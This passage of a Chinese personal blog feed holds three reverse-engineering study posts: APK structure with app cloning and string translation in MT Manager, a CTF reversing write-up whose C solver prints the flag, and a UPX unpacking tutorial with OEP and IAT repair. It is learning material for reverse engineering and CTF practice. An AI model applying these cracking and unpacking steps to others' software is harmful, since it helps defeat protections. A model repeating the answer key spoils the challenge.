    <content type="html"><![CDATA[<h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><p>APK 的全称是 Android Package，它扩展名为 .apk。APK 是 Android 应用程序的包文件格式。它是 Android 操作系统上安装应用程序的文件类型。APK 实际上是一个<strong>压缩包</strong>，其中包含了应用程序的所有文件，包括代码、资源、图像、音频和其他数据。APK 文件是将应用程序打包并分发到 Android 设备上的主要方式。在电脑上只要将.apk后缀改为7z就可以用压缩工具打开了。</p><span id="more"></span><table><thead><tr><th>文件</th><th>注释</th></tr></thead><tbody><tr><td>assets 目录</td><td>这个目录用于存放APK的静态资源文件，如视频、音频、图片等，存放的是<strong>未经编译处理</strong>的原始文件</td></tr><tr><td>lib 目录</td><td>这个目录包含了针对不同 CPU 架构的本地代码库文件。</td></tr><tr><td>META-INF 目录</td><td>这个目录包含了与 APK 文件的签名相关的信息，例如签名文件（.MF）、证书文件（.RSA 或 .DSA）等。这些文件用于验证 APK 文件的完整性和身份。</td></tr><tr><td>res 目录</td><td>用于存放编译后的资源文件的地方，例如图像、布局文件、字符串等。</td></tr><tr><td>AndroidManifest.xml 文件</td><td>这个文件是应用程序的清单文件，描述了应用程序的属性、权限、组件和其他重要信息。</td></tr><tr><td>classes.dex 文件</td><td>这个文件包含了应用程序的已编译 Java 代码，也就是Java的字节码文文件，是APK运行的主要逻辑。</td></tr><tr><td>resources.arsc 文件</td><td>这个文件是资源表文件，包含了应用程序使用的所有资源的索引和定义。</td></tr></tbody></table><h3 id="MT管理器"><a href="#MT管理器" class="headerlink" title="MT管理器"></a>MT管理器</h3><p>MT管理器（MT Manager）是一款功能强大的Android文件管理器和应用程序管理工具。它提供了许多高级功能和工具，可以帮助用户对安装在Android设备上的应用程序和文件进行管理、编辑、查看和修改。</p><h3 id="双开即原理"><a href="#双开即原理" class="headerlink" title="双开即原理"></a>双开即原理</h3><p>双开即在手机上打开两个相同应用，比如打开两个微信或者QQ。一台设备通常不允许两个名字相同的应用同时运行，因此我们可以通过修改包名的方法进行双开。</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014181313.png"></p><p>点击功能，点击APK共存，修改包名确定然后安装即可。最新版的np管理器不支持免费共存了，所以下载了一个旧版本，旧版本进去他会强制要求升级到最新版，然后我断开了模拟器的网络就可以正常使用了。</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014192339.png"></p><p>点开之后，成功运行。</p><h3 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h3><p>主要在后缀为arsc 、xml、dex的文件中</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015022605.png"></p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014192448.png"></p><p>将程序的英文部分翻译成中文呢，直接进入课程挑战<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014192831.png"></p><p>进入mt管理器，选择安装包之后，右上角三道杠，选择查看，点击高级搜索，下面文本输入hello，然后就定位到了jf.xml，通过前面的学习，我们知道了<strong>res目录</strong>用于存放编译后的资源文件的地方，例如图像、布局文件、<strong>字符串</strong>等。</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015014947.png">点击选择反编译,然后找到hello字符串修改成中文的<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015012902.png"></p><p>然后点击保存，并返回，勾选上自动签名，然后点击安装，发现安装失败，这是因为系统检测到了APK的签名发生了变化，我们可以通过卸载之前的应用避开这个问题，当然还有别的解决方案，只是现在为时尚早，就直接卸载再安装<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015014300.png"></p><p>你好 吾爱破解。</p><p>对于难以搜索的字符串，比如下面那句啥，俄语？</p><p>使用开发者助手</p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015020751.png"></p><p>可以直接复制，方法和上面类似，这一次定位到的是<strong>resources.arsc 文件</strong>  </p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015021522.png"></p><p>选择翻译模式，点击上方[default]，就能找到那个字符串，点击，写在翻译后，然乎确定保存并重新安装即可，这次发现不需要卸载应用那个步骤了，因为这两次的签名都是由mt提供的一个自带的签名信息。<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015021702.png"></p><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015021948.png"></p><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><table><thead><tr><th align="left">属性</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">versionCode</td><td align="left">版本号，主要用来更新，例如:12</td></tr><tr><td align="left">versionName</td><td align="left">版本名，给用户看的，例如:1.2</td></tr><tr><td align="left">package</td><td align="left">包名，例如：com.zj.52pj.demo</td></tr><tr><td align="left">uses-permission android:name&#x3D;””</td><td align="left">应用权限，例如：android.permission.INTERNET 代表网络权限</td></tr><tr><td align="left">android:label&#x3D;”@string&#x2F;app_name”</td><td align="left">应用名称</td></tr><tr><td align="left">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td><td align="left">应用图标路径</td></tr><tr><td align="left">android:debuggable&#x3D;”true”</td><td align="left">应用是否开启debug权限</td></tr></tbody></table><p>跟着大佬学：<a href="https://www.52pojie.cn/thread-1695796-1-1.html">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;apk&quot;&gt;&lt;a href=&quot;#apk&quot; class=&quot;headerlink&quot; title=&quot;apk&quot;&gt;&lt;/a&gt;apk&lt;/h3&gt;&lt;p&gt;APK 的全称是 Android Package，它扩展名为 .apk。APK 是 Android 应用程序的包文件格式。它是 Android 操作系统上安装应用程序的文件类型。APK 实际上是一个&lt;strong&gt;压缩包&lt;/strong&gt;，其中包含了应用程序的所有文件，包括代码、资源、图像、音频和其他数据。APK 文件是将应用程序打包并分发到 Android 设备上的主要方式。在电脑上只要将.apk后缀改为7z就可以用压缩工具打开了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android逆向" scheme="http://example.com/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>2023柏鹭杯rev1-wp</title>
    <link href="http://example.com/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <id>http://example.com/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</id>
    <published>2023-10-12T07:02:27.000Z</published>
    <updated>2023-10-12T07:02:27.367Z</updated>
    
    <content type="html"><![CDATA[<p>可以看到要求的输入长度是64个字符，前面是简单的验证输入的字符是否合规，红框圈起来的函数是主加密函数，下面可以不用分析了。</p><span id="more"></span><p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011202957.png"></p><p>动态调试F7步入函数。</p><p>加密部分可以划分为三块，每一块都是用AVX2汇编实现的，类似于进行了内联汇编。这是第一部分，将我们的输入与ebp-40处开始的32个字节进行异或操作并保存到ymm0处。<img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011203337.png"></p><p>第二部分是使用vphufb根据ebp-60处的32字节对ymm0处存放的数据进行重排。</p><p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011203404.png"></p><p>c语言代码表示vpshufb ymm0, ymm0 , index</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (int i <span class="operator">=</span> <span class="number">0</span><span class="comment">; i &lt; 32; ++i)</span></span><br><span class="line">   &#123;</span><br><span class="line">       ymm0[i] <span class="operator">=</span> ymm0[index[i]]<span class="comment">;</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最后是比较部分，ebp-20处存放的是比较数据。</p><p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011203428.png"></p><p>那么逆向过程就是：</p><ol><li>提取比较数据</li><li>重排</li><li>异或</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//加密过程</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> xordata[<span class="number">32</span>] = &#123;      <span class="comment">//异或数据，与input进行异或</span></span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0xEB</span>, <span class="number">0x5E</span>, <span class="number">0x76</span>, <span class="number">0x0F</span>, <span class="number">0x22</span>, <span class="number">0xAF</span>, <span class="number">0x31</span>, <span class="number">0x82</span>, <span class="number">0x92</span>, <span class="number">0x3C</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0xC1</span>, <span class="number">0x76</span>, <span class="number">0x06</span>, </span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x2F</span>, <span class="number">0xB5</span>, <span class="number">0x7D</span>, <span class="number">0x7F</span>, <span class="number">0x0A</span>, <span class="number">0xEA</span>, <span class="number">0x85</span>, <span class="number">0x92</span>, <span class="number">0x00</span>, <span class="number">0x89</span>, <span class="number">0xA3</span>, <span class="number">0x2C</span>, <span class="number">0xE2</span>, <span class="number">0xE7</span>, <span class="number">0x32</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> changedata[<span class="number">32</span>] = &#123;     <span class="comment">//重排表</span></span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x0F</span>, <span class="number">0x08</span>, <span class="number">0x0C</span>, </span><br><span class="line">    <span class="number">0x1B</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x1F</span>, <span class="number">0x14</span>, <span class="number">0x1E</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x15</span>, <span class="number">0x1D</span>, <span class="number">0x16</span>, <span class="number">0x1C</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>&#125;; </span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> cmpdata[<span class="number">32</span>] = &#123;     <span class="comment">//比较数据</span></span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x91</span>, <span class="number">0x99</span>, <span class="number">0xE8</span>, <span class="number">0x4E</span>, <span class="number">0xD0</span>, <span class="number">0xB0</span>, <span class="number">0x92</span>, <span class="number">0xB1</span>, <span class="number">0x3C</span>, <span class="number">0x4F</span>, <span class="number">0xF4</span>, <span class="number">0x17</span>, <span class="number">0x76</span>, <span class="number">0xDA</span>, <span class="number">0x12</span>, </span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0x35</span>, <span class="number">0x01</span>, <span class="number">0x15</span>, <span class="number">0xF9</span>, <span class="number">0x97</span>, <span class="number">0x5E</span>, <span class="number">0x19</span>, <span class="number">0x9D</span>, <span class="number">0xC2</span>, <span class="number">0x15</span>, <span class="number">0x99</span>, <span class="number">0x70</span>, <span class="number">0x7D</span>, <span class="number">0x9F</span>, <span class="number">0xCC</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> flag[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[changedata[<span class="number">31</span>-i]]=cmpdata[<span class="number">31</span>-i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[j]=flag[j]^xordata[j];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>,flag[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027</span></span><br><span class="line"><span class="comment">//flag&#123;ISEC-a49d6b847bdba62c5bfa0a43b69c8575&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231012145355.png"></p><p>逆向过程没啥障碍，写脚本的时候<code>flag[changedata[31-i]]=cmpdata[31-i];</code>31写成了32，造成了越界，但是非常的不明显<img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231012145647.png"></p><p>离谱的是vscode有时候能跑起来有时候跑不起来，这里记录一下，以后注意这个问题，可能需要安装一个检测这种小错误的插件。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;可以看到要求的输入长度是64个字符，前面是简单的验证输入的字符是否合规，红框圈起来的函数是主加密函数，下面可以不用分析了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>压缩壳原理即对坑-UPX为例</title>
    <link href="http://example.com/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/"/>
    <id>http://example.com/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/</id>
    <published>2023-10-10T18:49:22.000Z</published>
    <updated>2023-10-10T18:49:22.285Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是壳"><a href="#什么是壳" class="headerlink" title="什么是壳"></a>什么是壳</h3><p>壳，分为<strong>压缩壳</strong>，<strong>保护壳</strong>，<strong>伪装壳</strong>（对抗杀毒软件）</p><p>这篇文章讲以下压缩壳，压缩壳可以有效减少程序的体积，同时由于压缩之后的代码比较难懂，所以也有一定的保护作用，最常见的就是UPX壳。压缩壳不同于一般的压缩（7zp、rar等），它不需要解压缩操作，程序可以直接运行，用到的是一种<strong>运行时解压缩</strong>技术。</p><span id="more"></span><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20230621022516.png"></p><p>运行加壳程序，操作对象是notepad.exe，运行得到new.exe程序，大小从67584变为了48128字节。</p><p>这是notepad.exe对应的</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007173949.png"></p><p>这是new.exe对应的<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007174057.png"></p><p>加入的upx代码的作用是将2、3、4解压缩（还原）为7、8、9，并不影响程序的运行。在我们运行程序的瞬间2、3、4被还原为7、8、9。</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007181711.png"></p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231007182006.png"></p><p>可以看到，啥都看不到，看到的这些就是上文提到的2、3、4就是压缩之后的代码。壳可以手动脱也可以用脱壳机一键脱，当然脱不下来的话就要上手了。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><h4 id="机脱"><a href="#机脱" class="headerlink" title="机脱"></a>机脱</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">win+r</span><br><span class="line">d：/</span><br><span class="line">cd tools（upx文件夹所在的文件夹）</span><br><span class="line">cd upx</span><br><span class="line">upx.exe</span><br><span class="line">upx -d 程序名</span><br></pre></td></tr></table></figure><p>如果成功则程序直接发生更改，如果出现红色的字体则说明没有脱壳成功。</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20230404113409.png"></p><h4 id="手脱"><a href="#手脱" class="headerlink" title="手脱"></a>手脱</h4><p>手脱的工具需要</p><ul><li>ollydbg</li><li>lordpe  （在xp环境，反正win11不行）</li><li>ImportREC  （修复IAT）</li></ul><p>我们将有壳的程序拖入od他会弹出这个窗口，我们知道他是有壳的，所以不需要他继续分析啦，直接点否。</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010184402.png"></p><p>这段代码是壳的开始</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010184802.png"></p><p>我们知道壳的原理是运行时解压缩，壳这段操作实际上是在对压缩的原始程序进行解压随，对一段数据进行操作难免会用到循环，循环就会往上跳转，所以我们遇到向上跳转的汇编指令直接跳过，直接结束循环而不是进入循环（跳过的意思是一瞬间执行完所有循环）<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010185154.png"></p><p>可以看到jb这条指令会向上跳转，我们单机下面的mov指令然后F4（运行到），同理遇到jmp，jz，jnz一旦往上跳转我么都F4，需要注意的是call指令我们也不进入而是直接跳过。原因是我们会进入call调用的那个函数，容易迷失。</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010185519.png"></p><p>upx以及很多壳的一个明显特征是结尾有个大跳转<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010185730.png"></p><p>跳转的这个位置25DDAC就是OEP了，然后进行dump,用到的工具是lordpe，首先右键一下当前进程，点击修复大小。</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010233637.png"></p><p>然后右键选择完整转存，保存文件。运行</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231010234100.png"></p><p>哈哈哈，这是什么情况呢？我们需要修复一下IAT（import address table 导入地址表），要用到的工具是ImportREC，首先在importrec中选择未脱壳的进程(它的IAT是正确的)，注意这里的OEP要改成OPE的相对偏移地址，也就是OD看到的地址减去基地址0x400000得到1DDAC，然后点击<strong>自动查找IAT</strong>，接着<strong>获取输入表</strong>，最后选择<strong>转储到文件</strong>，转储的文件选择之前dump出来的那个文件，这就是修复IAT的过程。</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011002203.png"></p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011002614.png"></p><p>左边是脱壳之后的文件直接拖进od的结果，右边的是我们单步调试的带壳程序，并且脱完壳的程序是可以正常运行的，脱壳成功。<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011004257.png"></p><p>壳是脱完了，但是你是否有一个疑问，为什么要修复IAT?下面我们来了解一下</p><h3 id="修复IAT"><a href="#修复IAT" class="headerlink" title="修复IAT"></a>修复IAT</h3><p>来自知乎大佬的一句总结 ”不论是压缩壳还是加密壳，在脱壳过程中都需要修复IAT，因为<strong>脱壳时会将内存中的数据转储 (dump)到本地，保存成文件，而IAT在文件中是一个RVA数组，在内存中是一个函数地址数组</strong>。我们需要将转储出来的文件中的IAT修复成RVA数组的形式，这样程序才算是恢复。“ </p><p>这里接上之前学习<a href="https://fishjump-my.github.io/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/#more">PE的知识</a><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011011721.png"></p><p>IAT相当于一个进货清单，描述pe文件引用了哪些文件&#x2F;函数。在脱壳过程中，由于壳的修改，原来的IAT表项已经是无效的，无法正确识别真正的外部函数或模块。</p><p>修复IAT步骤：</p><ul><li>识别IAT表项：根据（未脱壳）程序的结构和特征，识别出加壳程序中被修改的IAT表项。对应的操作是”自动查询”IAT“</li><li>构建正确的IAT：根据原始的可执行文件，构建正确的IAT表项，使其能正确指向外部函数或模块。对应“获取IAT”</li><li>更新IAT表项：将构建好的IAT表项写入到程序中，覆盖原来呜嗷的表项，实现修复。对应“转储到文件”</li></ul><h3 id="OEP"><a href="#OEP" class="headerlink" title="OEP"></a>OEP</h3><p>什么是OEP呢，就是函数真正的入口。</p><p>下面我们多了解以下OEP的特征，毕竟如果不认识OEP的话，就算我们脱下了壳，也不知道自己成功了。直接偷懒截大佬们的文章了</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OEP：(Original <span class="keyword">Entry</span> Point)，程序的原始入口点。</span><br></pre></td></tr></table></figure><p><strong>VS特点</strong>：CALL和JMP,CALL进去之后调用的API是相同的<img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011022742.png"></p><p><strong>Delphi特点</strong>:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">esp</span>,-<span class="number">0x10</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,xxx</span><br></pre></td></tr></table></figure><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011023348.png"></p><p>QT特点：</p><p><img src="/2023/10/11/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8D%B3%E5%AF%B9%E5%9D%91-UPX%E4%B8%BA%E4%BE%8B/QQ%E6%88%AA%E5%9B%BE20231011023957.png"></p><p>本篇文章是拿最简单的壳开刀的，但是大致套路就是这样的，所谓万变不离其宗</p><p>参考链接：</p><p><a href="https://www.52pojie.cn/thread-1640646-1-1.html">各种程序的OEP入口特征汇总整理!专为小白总结！ - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p><a href="https://www.52pojie.cn/thread-234739-1-1.html">【初学者教程】破解基础知识之认识壳与程序的特征 - 『脱壳破解讨论求助区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p><a href="https://zhuanlan.zhihu.com/p/34263050#:~:text=%E8%84%B1%E5%A3%B3%E4%B8%AD%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E4%B8%80%E6%AD%A5%EF%BC%8C%E4%B8%8D%E8%AE%BA%E6%98%AF%E5%8E%8B%E7%BC%A9%E5%A3%B3%E8%BF%98%E6%98%AF%E5%8A%A0%E5%AF%86%E5%A3%B3%EF%BC%8C%E5%9C%A8%E8%84%B1%E5%A3%B3%E8%BF%87%E7%A8%8B%E4%B8%AD%E9%83%BD%E9%9C%80%E8%A6%81%E4%BF%AE%E5%A4%8DIAT%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%84%B1%E5%A3%B3%E6%97%B6%E4%BC%9A%E5%B0%86%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%82%A8,(dump)%E5%88%B0%E6%9C%AC%E5%9C%B0%EF%BC%8C%E4%BF%9D%E5%AD%98%E6%88%90%E6%96%87%E4%BB%B6%EF%BC%8C%E8%80%8CIAT%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%AD%E6%98%AF%E4%B8%80%E4%B8%AARVA%E6%95%B0%E7%BB%84%EF%BC%8C%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E6%95%B0%E7%BB%84%E3%80%82">使用x64dbg脱壳